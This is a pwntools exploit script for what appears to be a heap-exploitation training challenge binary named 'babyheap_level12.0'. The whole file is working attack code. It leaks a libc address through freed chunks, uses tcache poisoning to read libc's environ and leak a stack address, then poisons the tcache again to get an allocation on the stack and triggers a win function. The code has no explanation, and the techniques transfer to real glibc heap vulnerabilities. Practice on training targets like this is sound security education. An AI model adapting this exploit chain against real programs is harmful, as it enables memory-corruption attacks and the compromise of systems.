from pwn import *

r = process('/challenge/babyheap_level12.0')

def malloc(idx,num):
    r.sendline(b'malloc')
    r.sendline(f'{idx}'.encode())
    r.sendline(f'{num}'.encode())

def free(idx):
    r.sendline(b'free')
    r.sendline(f'{idx}'.encode())    

def edit(idx,s):
    r.sendline(b'scanf')
    r.sendline(f'{idx}'.encode())
    r.sendline(s)

def puts(idx):
    r.sendline(b'puts')
    r.sendline(f'{idx}'.encode())
    r.recvuntil(b'Data: ')

    return r.recvline().strip()

environ = 0x1ef2e0
for i in range(9):
    malloc(i,0x300)

for i in range(9):
    free(i)
libc = u64(puts(7)+b'\x00\x00') - 0x1ebbe0
print(hex(libc))

## leak stack
malloc(0,0x200)
malloc(1,0x200)
free(0)
free(1)
edit(1,p64(libc+environ))

malloc(2,0x200)
malloc(3,0x200)
stack = u64(puts(3)+b'\x00\x00')-0x218 +192
print(hex(stack))

## 
malloc(0,0x66)
malloc(1,0x66)
free(0)
free(1)
edit(1,p64(stack))
malloc(2,0x66)

r.sendline(b'stack_malloc_win')

r.interactive()